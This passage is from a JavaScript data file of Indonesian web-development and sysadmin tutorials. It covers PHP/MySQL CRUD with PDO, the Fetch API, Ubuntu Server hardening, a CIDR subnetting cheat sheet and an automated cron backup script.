        "<p>Kekuatan Tailwind terletak pada <strong>utility yang bisa dibaca langsung di markup</strong>. Kuasai tiga hal ini — breakpoint <code>md:</code>/<code>lg:</code>, layout <code>flex</code>/<code>grid</code>, dan pola <em>mobile-first</em> — maka hampir semua komponen landing page bisa dibuat tanpa menulis CSS kustom sama sekali.</p>" +
        callout(
          "note",
          "Untuk produksi, pertimbangkan memasang Tailwind via build tool (<code>npm i -D tailwindcss</code>) agar CSS yang dihasilkan hanya berisi class yang benar-benar dipakai, bukan seluruh framework.",
          "CATATAN"
        ),
    },

    "webdev-php-crud-mysql": {
      id: "webdev-php-crud-mysql",
      crumb: "CRUD PHP & MySQL",
      title: "Membuat Sistem CRUD Sederhana dengan PHP Native dan MySQL",
      category: "webdev",
      difficulty: "Intermediate",
      excerpt:
        "Tutorial lengkap membuat aplikasi CRUD (Create, Read, Update, Delete) dengan PHP native dan MySQL, memakai PDO prepared statements anti-SQL injection.",
      date: "2026-09-26",
      readTime: 16,
      lab: "XAMPP / PHP 8.2 + MySQL 8",
      author: "Admin KBHub",
      tags: ["php", "mysql", "crud", "pdo"],
      content:
        callout(
          "warning",
          "Materi ini untuk <strong>belajar & lingkungan lokal</strong>. Untuk produksi, tambahkan autentikasi, CSRF token, dan validasi menyeluruh. Selalu gunakan <strong>prepared statements</strong> — jangan pernah menyusun SQL dari input user secara langsung."
        ) +
        '<h2 id="database">1. Siapkan Database &amp; Tabel</h2>' +
        codeBlock(
          "sql",
          "CREATE DATABASE IF NOT EXISTS db_crud;\nUSE db_crud;\n\nCREATE TABLE mahasiswa (\n  id        INT AUTO_INCREMENT PRIMARY KEY,\n  nama      VARCHAR(100) NOT NULL,\n  email     VARCHAR(100) NOT NULL UNIQUE,\n  jurusan   VARCHAR(50),\n  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\nINSERT INTO mahasiswa (nama, email, jurusan) VALUES\n('Budi Santoso', 'budi@mail.com', 'Teknik Informatika'),\n('Siti Aminah',  'siti@mail.com','Sistem Informasi');"
        ) +
        '<h2 id="koneksi">2. Koneksi Database dengan PDO</h2>' +
        codeBlock(
          "php",
          "<?php\n// koneksi.php\n$host = '127.0.0.1';\n$db   = 'db_crud';\n$user = 'root';\n$pass = '';           // XAMPP default: kosong\n\ntry {\n    $pdo = new PDO(\n        \"mysql:host=$host;dbname=$db;charset=utf8mb4\",\n        $user, $pass,\n        [\n            PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,\n            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,\n            PDO::ATTR_EMULATE_PREPARES   => false,\n        ]\n    );\n} catch (PDOException $e) {\n    die('Koneksi gagal: ' . $e->getMessage());\n}"
        ) +
        '<h2 id="create">3. Create — Tambah Data</h2>' +
        codeBlock(
          "php",
          "<?php\n// proses tambah (tombol submit dari form)\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $stmt = $pdo->prepare(\n        'INSERT INTO mahasiswa (nama, email, jurusan) VALUES (?, ?, ?)'\n    );\n    $stmt->execute([\n        trim($_POST['nama']),\n        filter_var($_POST['email'], FILTER_VALIDATE_EMAIL),\n        trim($_POST['jurusan']),\n    ]);\n    header('Location: index.php');\n    exit;\n}"
        ) +
        '<h2 id="read">4. Read — Tampilkan Data</h2>' +
        codeBlock(
          "php",
          "<?php\n// index.php (bagian tabel)\nrequire 'koneksi.php';\n\n$rows = $pdo->query('SELECT * FROM mahasiswa ORDER BY id DESC')->fetchAll();\n?>\n<table border=\"1\" cellpadding=\"8\">\n  <tr><th>#</th><th>Nama</th><th>Email</th><th>Jurusan</th><th>Aksi</th></tr>\n<?php foreach ($rows as $r): ?>\n  <tr>\n    <td><?= (int)$r['id'] ?></td>\n    <td><?= htmlspecialchars($r['nama']) ?></td>\n    <td><?= htmlspecialchars($r['email']) ?></td>\n    <td><?= htmlspecialchars($r['jurusan']) ?></td>\n    <td>\n      <a href=\"edit.php?id=<?= (int)$r['id'] ?>\">Edit</a>\n      <a href=\"hapus.php?id=<?= (int)$r['id'] ?>\"\n         onclick=\"return confirm('Hapus data ini?')\">Hapus</a>\n    </td>\n  </tr>\n<?php endforeach; ?>\n</table>"
        ) +
        callout(
          "note",
          "<code>htmlspecialchars()</code> wajib dipakai saat menampilkan data ke HTML untuk mencegah <strong>XSS</strong> (Cross-Site Scripting). Parameternya diikat sebagai angka <code>(int)</code> agar tidak bisa dimanipulasi."
        ) +
        '<h2 id="update">5. Update — Ubah Data</h2>' +
        codeBlock(
          "php",
          "<?php\n// edit.php\nrequire 'koneksi.php';\n$id = (int)($_GET['id'] ?? 0);\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $stmt = $pdo->prepare(\n        'UPDATE mahasiswa SET nama=?, email=?, jurusan=? WHERE id=?'\n    );\n    $stmt->execute([\n        $_POST['nama'], $_POST['email'], $_POST['jurusan'], $id\n    ]);\n    header('Location: index.php');\n    exit;\n}\n\n$stmt = $pdo->prepare('SELECT * FROM mahasiswa WHERE id = ?');\n$stmt->execute([$id]);\n$mhs = $stmt->fetch();\nif (!$mhs) { die('Data tidak ditemukan'); }\n?>"
        ) +
        '<h2 id="delete">6. Delete — Hapus Data</h2>' +
        codeBlock(
          "php",
          "<?php\n// hapus.php\nrequire 'koneksi.php';\n$id = (int)($_GET['id'] ?? 0);\n\n$stmt = $pdo->prepare('DELETE FROM mahasiswa WHERE id = ?');\n$stmt->execute([$id]);\n\nheader('Location: index.php');\nexit;"
        ) +
        '<h2 id="keamanan">7. Ringkasan Keamanan Wajib</h2>' +
        "<ul>" +
        "<li><strong>Prepared statements (PDO/mysqli)</strong> — cegah SQL Injection</li>" +
        "<li><strong>htmlspecialchars()</strong> — cegah XSS saat output</li>" +
        "<li><strong>(int) cast</strong> pada ID — cegah manipulasi parameter</li>" +
        "<li><strong>CSRF token</strong> pada setiap form — cegah request palsu</li>" +
        "<li><strong>Password_hash()</strong> — bila nanti menambahkan login</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>CRUD adalah tulang punggung hampir semua aplikasi web. Setelah mahir pola PDO ini, kamu bisa naik ke framework (Laravel, CodeIgniter) tanpa kehilangan pemahaman tentang apa yang sebenarnya terjadi di balik layar.</p>" +
        callout(
          "tip",
          "Tantangan lanjutan: tambahkan fitur <strong>pencarian</strong> (WHERE nama LIKE), <strong>paginasi</strong> (LIMIT/OFFSET), dan <strong>validasi form server-side</strong> sebelum lanjut ke topik berikutnya.",
          "LATIHAN"
        ),
    },

    "webdev-fetch-api-javascript": {
      id: "webdev-fetch-api-javascript",
      crumb: "Fetch API JavaScript",
      title: "Integrasi REST API dan Fetch Data Menggunakan JavaScript Modern",
      category: "webdev",
      difficulty: "Intermediate",
      excerpt:
        "Panduan memanggil REST API dengan Fetch API dan async/await: menangani response JSON, error handling, request POST/PUT, hingga rendering data dinamis ke DOM.",
      date: "2026-09-21",
      readTime: 13,
      lab: "Browser + VS Code Live Server",
      author: "Admin KBHub",
      tags: ["javascript", "fetch", "api", "async-await"],
      content:
        '<h2 id="konsep">1. Konsep REST API</h2>' +
        "<p><strong>REST API</strong> berkomunikasi lewat HTTP dengan metode yang bermakna: <code>GET</code> (ambil), <code>POST</code> (buat), <code>PUT/PATCH</code> (ubah), <code>DELETE</code> (hapus). Respons umumnya berupa JSON.</p>" +
        '<table><thead><tr><th>Metode</th><th>Tujuan</th><th>Contoh endpoint</th></tr></thead><tbody>' +
        "<tr><td><code>GET</code></td><td>Ambil data</td><td><code>/api/users</code></td></tr>" +
        "<tr><td><code>POST</code></td><td>Buat data baru</td><td><code>/api/users</code></td></tr>" +
        "<tr><td><code>PUT</code></td><td>Perbarui data</td><td><code>/api/users/1</code></td></tr>" +
        "<tr><td><code>DELETE</code></td><td>Hapus data</td><td><code>/api/users/1</code></td></tr>" +
        "</tbody></table>" +
        '<h2 id="fetch-get">2. Fetch Data (GET) dengan Async/Await</h2>' +
        codeBlock(
          "javascript",
          "const API = 'https://jsonplaceholder.typicode.com/users';\n\nasync function ambilUsers() {\n  try {\n    const res = await fetch(API);\n\n    // PENTING: fetch TIDAK melempar error untuk status 404/500\n    // harus dicek manual lewat res.ok\n    if (!res.ok) {\n      throw new Error(`HTTP ${res.status} — ${res.statusText}`);\n    }\n\n    const users = await res.json();   // parsing JSON\n    render(users);\n  } catch (err) {\n    console.error('Gagal memuat:', err.message);\n    document.querySelector('#list').innerHTML =\n      `<p class=\"text-red-500\">Error: ${err.message}</p>`;\n  }\n}\n\nfunction render(users) {\n  const html = users.map(u => `\n    <li class=\"p-3 border-b border-slate-700\">\n      <strong>${u.name}</strong><br>\n      <span class=\"text-slate-400 text-sm\">${u.email}</span>\n    </li>`).join('');\n\n  document.querySelector('#list').innerHTML = html;\n}\n\nambilUsers();"
        ) +
        callout(
          "warning",
          "Kesalahan paling umum: menganggap <code>fetch()</code> otomatis gagal saat status respons 404/500. <strong>Tidak</strong> — fetch hanya reject ketika jaringan bermasalah. Selalu periksa <code>res.ok</code> secara manual."
        ) +
        '<h2 id="post">3. Kirim Data (POST/PUT)</h2>' +
        codeBlock(
          "javascript",
          "async function tambahUser(data) {\n  const res = await fetch('https://jsonplaceholder.typicode.com/users', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'Accept': 'application/json',\n    },\n    body: JSON.stringify(data),   // objek → string JSON\n  });\n\n  if (!res.ok) throw new Error('Gagal menyimpan data');\n  return res.json();\n}\n\n// pemakaian\nawait tambahUser({\n  name: 'Andi',\n  email: 'andi@mail.com',\n  username: 'andi-dev',\n});"
        ) +
        '<h2 id="timeout">4. Timeout &amp; Abort</h2>' +
        "<p>Fetch tidak punya timeout bawaan. Gunakan <strong>AbortController</strong> agar request yang menggantung tidak menunggu selamanya:</p>" +
        codeBlock(
          "javascript",
          "async function fetchDenganTimeout(url, ms = 8000) {\n  const ctrl = new AbortController();\n  const timer = setTimeout(() => ctrl.abort(), ms);\n\n  try {\n    const res = await fetch(url, { signal: ctrl.signal });\n    return await res.json();\n  } finally {\n    clearTimeout(timer);\n  }\n}\n\ntry {\n  const data = await fetchDenganTimeout('/api/laporan');\n  console.log(data);\n} catch (e) {\n  console.error(e.name === 'AbortError' ? 'Timeout!' : e.message);\n}"
        ) +
        '<h2 id="error">5. Pola Error Handling yang Rapi</h2>' +
        codeBlock(
          "javascript",
          "// pembungkus reusable agar pemanggilan lebih bersih\nasync function api(url, options = {}) {\n  const res = await fetch(url, {\n    ...options,\n    headers: {\n      'Content-Type': 'application/json',\n      ...options.headers,\n    },\n  });\n\n  if (!res.ok) {\n    const err = await res.json().catch(() => ({}));\n    throw new Error(err.message || `Error ${res.status}`);\n  }\n\n  return res.status === 204 ? null : res.json();\n}\n\n// pemakaian jadi ringkas\nconst users = await api('/api/users');\nawait api('/api/users/1', { method: 'DELETE' });"
        ) +
        '<h2 id="cors">6. Catatan CORS</h2>' +
        "<p>Jika muncul error <em>&quot;Failed to fetch: CORS policy&quot;</em>, berarti server API tidak mengizinkan domain kamu. Solusi:</p>" +
        "<ul>" +
        "<li>Di server API: set header <code>Access-Control-Allow-Origin</code> yang benar</li>" +
        "<li>Saat development: pakai proxy atau matikan CORS sementara di browser via flag khusus (<code>--disable-web-security</code> — hanya untuk lokal!)</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Pola inti Fetch modern: <strong><code>fetch → cek res.ok → res.json() → render DOM</code></strong>, dibungkus <code>async/await</code> + <code>try/catch</code>. Setelah menguasai ini, library seperti Axios atau React Query hanyalah pembungkus dengan fitur tambahan.</p>" +
        callout(
          "tip",
          "Latihan: buat aplikasi pencarian GitHub user — ketik di input, debounce 400 ms, fetch ke <code>api.github.com/search/users?q=...</code>, lalu tampilkan hasil dengan loading state dan pesan error yang jelas.",
          "LATIHAN"
        ),
    },

    "ubuntu-server-2404-setup": {
      id: "ubuntu-server-2404-setup",
      crumb: "Instalasi & Hardening Ubuntu Server",
      title: "Instalasi & Hardening Ubuntu Server 24.04 LTS",
      category: "itsupport",
      difficulty: "Beginner",
      excerpt:
        "Dari instalasi awal, konfigurasi SSH key-based auth, firewall UFW, sampai patching otomatis — panduan admin server untuk pemula.",
      date: "2026-09-28",
      readTime: 18,
      lab: "Ubuntu Server 24.04 LTS (VM / VPS)",
      author: "Admin KBHub",
      tags: ["ubuntu", "server", "hardening", "installation"],
      content:
        callout(
          "note",
          "Panduan ini memakai <strong>Ubuntu Server 24.04 LTS (Noble Numbat)</strong>. Prinsipnya sama untuk VPS (DigitalOcean, AWS EC2, Hetzner) maupun mesin fisik di datacenter."
        ) +
        '<h2 id="persiapan">1. Persiapan &amp; Unduh ISO</h2>' +
        "<ul>" +
        "<li>Unduh ISO dari <code>ubuntu.com/download/server</code> — pilih LTS untuk stabilitas jangka panjang</li>" +
        "<li>Untuk VPS, biasanya tersedia image langsung sehingga langkah instalasi bisa dilewati</li>" +
        "<li>Siapkan akses <strong>console/IPMI/VNC</strong> untuk instalasi awal</li>" +
        "<li>Catat IP publik, gateway, DNS, dan kredensial root/VPS dari provider</li>" +
        "</ul>" +
        '<h2 id="instalasi">2. Instalasi Interaktif</h2>' +
        "<p>Installer Ubuntu Server kini berbasis teks tapi ramah pemula. Poin penting saat proses instalasi:</p>" +
        codeBlock(
          "bash",
          "# 1. pilih bahasa & keyboard\n# 2. Network  -> pastikan DHCP/static sesuai kebutuhan\n# 3. Proxy    -> kosongkan bila tidak dipakai\n# 4. Mirror   -> gunakan mirror lokal bila ada (lebih cepat)\n# 5. Storage  -> pilih 'Use an entire disk' + LVM\n# 6. Profile  -> buat user & password (jangan pakai 'root')\n# 7. SSH      -> PASTIKAN centang 'Install OpenSSH server'\n# 8. Featured -> centang 'Ubuntu Pro' / Snaps sesuai kebutuhan\n# 9. Restart  -> lepas media instalasi, boot ke sistem"
        ) +
        callout(
          "warning",
          "Saat instalasi, <strong>jangan lewati pemasangan OpenSSH</strong> bila kamu mengelola server dari jarak jauh. Tanpa SSH dan tanpa akses console, kamu bisa terkunci keluar dari server sendiri."
        ) +
        '<h2 id="dasar">3. Konfigurasi Dasar Awal</h2>' +
        codeBlock(
          "bash",
          "# login pertama kali\nssh user@IP_SERVER\n\n# perbarui seluruh paket\nsudo apt update && sudo apt full-upgrade -y\n\n# set hostname & zona waktu\nsudo hostnamectl set-hostname webserver-01\ntimedatectl set-timezone Asia/Jakarta\n\n# cek status sistem\nsudo systemctl status ssh\nip a"
        ) +
        '<h2 id="ssh">4. SSH Key-Based Auth (Wajib)</h2>' +
        "<p>Masuk dengan password berisiko kena brute force. Beralih ke kunci SSH jauh lebih aman.</p>" +
        codeBlock(
          "bash",
          "# DI MESIN LOKAL (bukan server): buat keypair\nssh-keygen -t ed25519 -C \"admin@kbhub\"\n\n# salin public key ke server\nssh-copy-id user@IP_SERVER\n\n# uji login tanpa password\nssh user@IP_SERVER\n\n# DI SERVER: setelah berhasil, matikan login password\nsudo nano /etc/ssh/sshd_config\n#   PasswordAuthentication no\n#   PermitRootLogin no\nsudo systemctl restart ssh"
        ) +
        '<h2 id="firewall">5. Firewall UFW</h2>' +
        codeBlock(
          "bash",
          "sudo apt install ufw -y\n\n# atur default: tolak semua, izinkan yang dibutuhkan saja\nsudo ufw default deny incoming\nsudo ufw default allow outgoing\n\nsudo ufw allow OpenSSH        # port 22\nsudo ufw allow 80/tcp         # HTTP\nsudo ufw allow 443/tcp        # HTTPS\n\nsudo ufw enable\nsudo ufw status verbose"
        ) +
        callout(
          "warning",
          "Selalu izinkan <strong>OpenSSH sebelum mengaktifkan UFW</strong>. Jika firewall aktif dan port 22 tertutup tanpa akses console, kamu tidak akan bisa masuk lagi."
        ) +
        '<h2 id="patching">6. Patching Otomatis</h2>' +
        "<p>Agar keamanan terjaga tanpa intervensi manual, aktifkan <strong>unattended-upgrades</strong> untuk update keamanan otomatis.</p>" +
        codeBlock(
          "bash",
          "sudo apt install unattended-upgrades apt-listchanges -y\nsudo dpkg-reconfigure -plow unattended-upgrades\n\n# pilih Yes saat diminta enable periodic updates\n\n# verifikasi konfigurasi\nsudo nano /etc/apt/apt.conf.d/50unattended-upgrades\n#   Unattended-Upgrade::Allowed-Origins {\n#     \"${distro_id}:${distro_codename}-security\";\n#   };\n#   Unattended-Upgrade::Automatic-Reboot \"false\";"
        ) +
        '<h2 id="monitoring">7. Monitoring &amp; Verifikasi</h2>' +
        codeBlock(
          "bash",
          "# cek beban & memori\nuptime\nfree -h\ndf -h\n\n# port yang listening\nsudo ss -tulpn\n\n# layanan yang gagal\nsystemctl --failed\n\n# log keamanan (percobaan login)\nsudo journalctl -u ssh | tail -n 20"
        ) +
        '<h2 id="checklist">8. Checklist Hardening Ringkas</h2>' +
        '<table><thead><tr><th>Area</th><th>Tindakan</th></tr></thead><tbody>' +
        "<tr><td>Akses</td><td>SSH key-only, matikan root login &amp; password auth</td></tr>" +
        "<tr><td>Firewall</td><td>UFW deny incoming, buka port seperlunya</td></tr>" +
        "<tr><td>Update</td><td>unattended-upgrades untuk patch keamanan</td></tr>" +
        "<tr><td>Akun</td><td>Gunakan sudo, hindari user <code>root</code> langsung</td></tr>" +
        "<tr><td>Layanan</td><td>Nonaktifkan service tak terpakai (disable + mask)</td></tr>" +
        "<tr><td>Log</td><td>Pantau <code>journalctl</code> &amp; pasang fail2ban bila perlu</td></tr>" +
        "</tbody></table>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Server yang aman dibangun dari kebiasaan kecil yang konsisten: <strong>SSH key, firewall ketat, dan patch otomatis</strong>. Setelah tiga hal ini aktif, servermu sudah lebih aman daripada mayoritas mesin yang ditinggal default dari pabrik.</p>" +
        callout(
          "tip",
          "Langkah lanjutan: pasang <strong>fail2ban</strong> untuk memblokir IP yang gagal login berulang, dan aktifkan <strong>UFW logging</strong> agar aktivitas mencurigakan tercatat.",
          "TIPS"
        ),
    },

    "subnetting-cheatsheet": {
      id: "subnetting-cheatsheet",
      crumb: "Cheat Sheet Subnetting CIDR",
      title: "Subnetting Cepat: Cheat Sheet CIDR untuk Teknisi Jaringan",
      category: "networking",
      difficulty: "Beginner",
      excerpt:
        "Rumus praktis dan tabel referensi cepat subnetting CIDR, VLSM, serta cara menghitung broadcast address tanpa kalkulator.",
      date: "2026-09-25",
      readTime: 8,
      lab: "Kertas + Hati-hati (cepat!)",
      author: "Admin KBHub",
      tags: ["subnetting", "cidr", "vlsm", "networking"],
      content:
        callout(
          "note",
          "Ini adalah <strong>referensi cepat</strong> — bukan penjelasan teori panjang. Untuk memahami dasar perhitungannya, baca dulu artikel <a href='article.html?id=networking-subnetting-guide' class='text-emerald-400 underline'>Panduan Subnetting IPv4 Lengkap</a>."
        ) +
        '<h2 id="rumus-kilat">1. Tiga Rumus Kilat</h2>' +
        '<table><thead><tr><th>Butuh</th><th>Rumus Kilat</th></tr></thead><tbody>' +
        "<tr><td>Jumlah host</td><td><code>2^(32-CIDR) - 2</code></td></tr>" +
        "<tr><td>Block size</td><td><code>256 - oktet terakhir mask</code></td></tr>" +
        "<tr><td>Network address</td><td><code>IP AND mask</code> (atau bulatkan ke bawah kelipatan block)</td></tr>" +
        "</tbody></table>" +
        codeBlock(
          "bash",
          "# contoh cepat: 192.168.1.57/27\n# host  = 2^(32-27)-2 = 2^5-2 = 30 host\n# block = 256 - 224   = 32\n# jaringan: kelipatan 32 terdekat <= 57  ->  .32\n# range   : .33 - .62\n# broadcast: .63"
        ) +
        '<h2 id="tabel-cidr">2. Tabel CIDR Referensi Cepat</h2>' +
        '<table><thead><tr><th>CIDR</th><th>Mask</th><th>Host</th><th>Block</th><th>Networks</th></tr></thead><tbody>' +
        "<tr><td>/24</td><td>.0</td><td>254</td><td>256</td><td>1</td></tr>" +
        "<tr><td>/25</td><td>.128</td><td>126</td><td>128</td><td>2</td></tr>" +
        "<tr><td>/26</td><td>.192</td><td>62</td><td>64</td><td>4</td></tr>" +
        "<tr><td>/27</td><td>.224</td><td>30</td><td>32</td><td>8</td></tr>" +
        "<tr><td>/28</td><td>.240</td><td>14</td><td>16</td><td>16</td></tr>" +
        "<tr><td>/29</td><td>.248</td><td>6</td><td>8</td><td>32</td></tr>" +
        "<tr><td>/30</td><td>.252</td><td>2</td><td>4</td><td>64</td></tr>" +
        "</tbody></table>" +
        callout(
          "tip",
          "Hafalkan deret <strong>128, 192, 224, 240, 248, 252</strong> untuk oktet terakhir. Deret ini muncul terus di hampir semua soal subnetting dan wajib hafal di luar kepala."
        ) +
        '<h2 id="broadcast">3. Trik Broadcast Address</h2>' +
        "<p>Broadcast = network address + block size − 1. Cukup lihat oktet terakhir:</p>" +
        codeBlock(
          "bash",
          "# 10.0.0.128/26  -> block 64\n# network  = .128\n# broadcast = .128 + 64 - 1 = .191\n\n# 172.16.5.64/28  -> block 16\n# network  = .64\n# broadcast = .64 + 16 - 1 = .79"
        ) +
        '<h2 id="vlsm">4. VLSM Cepat (urut dari yang terbesar)</h2>' +
        "<ol>" +
        "<li>Daftar kebutuhan host tiap segmen</li>" +
        "<li><strong>Urutkan dari kebutuhan terbesar ke terkecil</strong></li>" +
        "<li>Alokasikan blok berurutan, catat network-nya</li>" +
        "<li>Sisipkan segmen kecil di sisa ruang agar tidak ada alamat terbuang</li>" +
        "</ol>" +
        codeBlock(
          "bash",
          "# butuh: 100 host, 30 host, 2 host (dari 192.168.1.0/24)\n# urut besar->kecil:\n#   100 host -> /25 (126 host) : .0    - .127\n#    30 host -> /27 (30 host)  : .128  - .159\n#     2 host -> /30 (2 host)   : .160  - .163\n# sisa .164 - .255 bisa dipakai untuk perluasan"
        ) +
        '<h2 id="cidr-ke-mask">5. Mengubah CIDR ke Mask Instan</h2>' +
        codeBlock(
          "bash",
          "# /24 = 255.255.255.0\n# /25 = 255.255.255.128    (/24 + 128)\n# /26 = 255.255.255.192    (/24 + 192)\n# /27 = 255.255.255.224\n# /28 = 255.255.255.240\n# /29 = 255.255.255.248\n# /30 = 255.255.255.252\n\n# untuk /8, /16, /17 dst (oktet depan):\n# /16 = 255.255.0.0\n# /18 = 255.255.192.0   (oktet kedua, pola sama)"
        ) +
        '<h2 id="uji-cepat">6. Soal Uji Kecepatan</h2>' +
        "<p>Coba kerjakan dalam hitungan detik, lalu cocokkan kuncinya:</p>" +
        '<table><thead><tr><th>Soal</th><th>Jawaban</th></tr></thead><tbody>' +
        "<tr><td>Host pada 10.1.2.0/28?</td><td>14 host</td></tr>" +
        "<tr><td>Broadcast 192.168.5.64/27?</td><td>192.168.5.95</td></tr>" +
        "<tr><td>Network 172.16.9.100/26?</td><td>172.16.9.64</td></tr>" +
        "<tr><td>Block size /29?</td><td>8</td></tr>" +
        "</tbody></table>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Subnetting cepat bergantung pada tiga hal: <strong>hafalan deret block size</strong>, <strong>rumus 2^h − 2</strong>, dan <strong>latihan berulang dengan timer</strong>. Simpan tabel ini sebagai rujukan cepat saat bekerja di lapangan atau mengerjakan ujian sertifikasi.</p>",
    },

    "shell-scripting-backup-otomatis": {
      id: "shell-scripting-backup-otomatis",
      crumb: "Otomatisasi Backup dengan Cron",
      title: "Shell Scripting: Otomatisasi Backup Harian dengan Cron",
      category: "linux",
      difficulty: "Intermediate",
      excerpt:
        "Bangun script bash backup terenkripsi dengan logging, rotasi, dan notifikasi email — dijadwalkan otomatis via cron job.",
      date: "2026-09-22",
      readTime: 14,
      lab: "Ubuntu 22.04 + cron + GPG",
      author: "Admin KBHub",
      tags: ["bash", "scripting", "cron", "backup"],
      content:
        callout(
          "note",
          "Artikel ini fokus pada <strong>penjadwalan & produksi</strong>: cron, logging, rotasi, enkripsi, dan notifikasi. Untuk dasar sintaks Bash (variabel, loop, fungsi), baca dulu <a href='article.html?id=linux-bash-scripting' class='text-emerald-400 underline'>Automasi dengan Bash Shell Scripting</a>."
        ) +
        '<h2 id="prinsip">1. Prinsip Backup 3-2-1</h2>' +
        "<p>Aturan emas backup: <strong>3</strong> salinan data, di <strong>2</strong> media berbeda, dengan <strong>1</strong> salinan di lokasi terpisah (offsite). Script ini menangani sisi otomatisasi — kamu tetap perlu target offsite (rsync remote, cloud storage, atau tape).</p>" +
        '<h2 id="script">2. Script Backup dengan Log &amp; Rotasi</h2>' +
        codeBlock(
          "bash",
          "#!/bin/bash\nset -euo pipefail\n\n# ---------- konfigurasi ----------\nSRC=(\"/var/www\" \"/etc\" \"/home\")\nDEST=\"/backup\"\nLOG=\"/var/log/backup.log\"\nKEEP=14          # simpan 14 backup terakhir\nSTAMP=$(date +%Y%m%d-%H%M%S)\nARCHIVE=\"$DEST/backup-$STAMP.tar.gz\"\n\nlog() { echo \"[$(date '+%F %T')] $1\" | tee -a \"$LOG\"; }\n\n# ---------- proses ----------\nlog \"Memulai backup...\"\nmkdir -p \"$DEST\"\n\ntar -czf \"$ARCHIVE\" \"${SRC[@]}\" 2>>\"$LOG\"\nSIZE=$(du -h \"$ARCHIVE\" | cut -f1)\nlog \"Arsip dibuat: $ARCHIVE ($SIZE)\"\n\n# ---------- verifikasi ----------\nif tar -tzf \"$ARCHIVE\" >/dev/null 2>&1; then\n  log \"Verifikasi arsip OK\"\nelse\n  log \"ERROR: arsip korup!\"\n  exit 1\nfi\n\n# ---------- rotasi ----------\ncd \"$DEST\"\nls -1t backup-*.tar.gz | tail -n +$((KEEP+1)) | xargs -r rm -f\nlog \"Rotasi selesai, menyimpan $KEEP terakhir\"\nlog \"Selesai.\""
        ) +
        callout(
          "warning",
          "Perintah <code>tar -czf</code> menimpa file lama bila nama sama. Karena kita memakai timestamp unik (<code>%H%M%S</code>), risiko ini hilang — tapi pastikan <strong>verifikasi arsip</strong> (langkah <code>tar -tzf</code>) selalu ada agar backup yang korup terdeteksi lebih awal."
        ) +
        '<h2 id="enkripsi">3. Enkripsi dengan GPG</h2>' +
        codeBlock(
          "bash",
          "# buat kunci simetris sekali saja\ngpg --batch --yes --passphrase \"$PASS\" --symmetric --cipher-algo AES256 \"$ARCHIVE\"\nrm -f \"$ARCHIVE\"    # hapus versi plaintext\n\n# dekripsi saat butuh\ngpg --batch --passphrase-file /root/.backup-pass \\\n    --decrypt backup-20260922-020000.tar.gz.gpg > backup.tar.gz"
        ) +
        '<h2 id="notifikasi">4. Notifikasi Email (Maildir / msmtp)</h2>' +
        codeBlock(
          "bash",
          "# di akhir script, kirim status via email\nSUBJECT=\"[Backup] $(hostname) - $(date +%F)\"\nif [ \"$?\" -eq 0 ]; then\n  BODY=\"Backup BERHASIL: $ARCHIVE ($SIZE)\"\nelse\n  BODY=\"Backup GAGAL, cek log $LOG\"\nfi\n\necho -e \"Subject: $SUBJECT\\n\\n$BODY\" | sendmail admin@contoh.com\n\n# alternatif tanpa MTA: webhook Telegram\n# curl -s -X POST \"https://api.telegram.org/bot$TOKEN/sendMessage\" \\\n#   -d chat_id=$CHAT_ID -d text=\"$BODY\""
        ) +
        '<h2 id="cron">5. Penjadwalan via Cron</h2>' +
        codeBlock(
          "bash",
          "# buka editor crontab root\ncrontab -e\n\n# ---------- contoh jadwal ----------\n# setiap hari pukul 02:00\n0 2 * * *  /root/backup.sh >> /var/log/backup.cron 2>&1\n\n# setiap minggu Minggu 03:30\n30 3 * * 0 /root/backup.sh --full >> /var/log/backup.cron 2>&1\n\n# tiap jam genap (00,02,...22)\n0 */2 * * * /root/backup-mirror.sh\n\n# verifikasi semua job root\ncrontab -l"
        ) +
        '<table><thead><tr><th>Posisi</th><th>Arti</th><th>Contoh</th></tr></thead><tbody>' +
        "<tr><td>1</td><td>Menit</td><td>0-59</td></tr>" +
        "<tr><td>2</td><td>Jam</td><td>0-23</td></tr>" +
        "<tr><td>3</td><td>Tanggal</td><td>1-31</td></tr>" +
        "<tr><td>4</td><td>Bulan</td><td>1-12</td></tr>" +
        "<tr><td>5</td><td>Hari</td><td>0-6 (Min-Sab)</td></tr>" +
        "<tr><td>6</td><td>Perintah</td><td>path script</td></tr>" +
        "</tbody></table>" +
        callout(
          "note",
          "Cron tidak mewarisi <code>PATH</code> shell penuh. Selalu gunakan <strong>path absolut</strong> ke binary dan script (mis. <code>/usr/bin/tar</code>, <code>/root/backup.sh</code>) agar job tidak diam-diam gagal."
        ) +
        '<h2 id="anacron">6. anacron untuk Mesin yang Sering Mati</h2>' +
        codeBlock(
          "bash",
          "# anacron menjalankan job yang terlewat (laptop/server yang sering off)\nsudo nano /etc/anacrontab\n# 1     15      daily.backup      /root/backup.sh\n# cari  delay(min)  job-id        command\n\n# format: period  delay  job-id  command\n# period: daily / weekly / monthly"
        ) +
        '<h2 id="verifikasi">7. Verifikasi &amp; Uji Restore</h2>' +
        codeBlock(
          "bash",
          "# jalankan manual dulu (jangan langsung andalkan cron)\nsudo bash /root/backup.sh\ncat /var/log/backup.log\n\n# daftar isi arsip\nls -lh /backup/\ntar -tzf /backup/backup-*.tar.gz | head\n\n# PENTING: uji proses RESTORE minimal sekali\nsudo tar -xzf /backup/backup-20260922-020000.tar.gz -C /tmp/restore-test"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Backup yang baik bukan sekadar script yang jalan, tapi sistem yang <strong>terverifikasi</strong>: log jelas, arsip dirotasi, enkripsi bila berisi data sensitif, dan — yang paling sering dilupakan — <strong>diuji restore-nya</strong>. Backup yang belum pernah direstore sama sekali belum bisa disebut backup.</p>" +
        "<p>Checklist produksi sebelum script dianggap siap:</p>" +
        "<ul>" +
        "<li><strong>Log</strong> — setiap eksekusi meninggalkan jejak dengan timestamp</li>" +
        "<li><strong>Rotasi</strong> — arsip lama dibersihkan otomatis agar disk tidak penuh</li>" +
